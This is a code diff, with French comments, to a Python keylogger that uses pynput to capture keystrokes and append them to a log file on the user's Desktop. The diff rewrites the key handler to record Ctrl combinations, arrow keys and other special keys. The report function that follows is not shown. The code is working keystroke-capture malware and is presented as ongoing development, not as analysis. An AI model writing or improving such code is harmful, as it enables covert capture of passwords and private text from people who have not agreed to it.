@@ -1,4 +1,4 @@
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Listener, KeyCode
 import threading
 import os
 import time
@@ -11,22 +11,36 @@ is_first_run = True  # pour vérifier s'il s'agit de la première itération
 log = ""
 path =  os.path.join(os.path.expanduser("~"), "Desktop/log.txt")
 
-def processkeys(key):
-    global log, last_keypress_time
-    last_keypress_time = time.time()
-    try:
-        log += key.char
-    except AttributeError:
-        if key == Key.space:
-            log += ' '
-        elif key == Key.enter:
-            log += '\n'
-        elif key == Key.backspace:
-            log = log[:-1]
+def process_keys(key):
+    global log, last_keypress_time, current_keys
+
+    with lock:
+        last_keypress_time = time.time()
+
+        if isinstance(key, KeyCode):  # Gestion des touches standards
+            log += key.char
+        elif key in {Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r, Key.shift, Key.shift_r}:
+            current_keys.add(key)  # Ajouter la touche spéciale active
+        elif key in current_keys:  # Gestion des combinaisons détectées
+            if Key.ctrl_l in current_keys or Key.ctrl_r in current_keys:
+                log += "[Ctrl+{}]".format(key)
         else:
-            log += ''
+            special_keys = {
+                Key.space: " ",
+                Key.enter: "\n",
+                Key.backspace: "\b",
+                Key.up: "[UP]",
+                Key.down: "[DOWN]",
+                Key.left: "[LEFT]",
+                Key.right: "[RIGHT]",
+            }
+            log += special_keys.get(key, "")
+    on_release(key)
     
-    
+def on_release(key):
+    """Supprimer les touches relâchées des combinaisons."""
+    if key in current_keys:
+        current_keys.remove(key)
 
 
 def report():
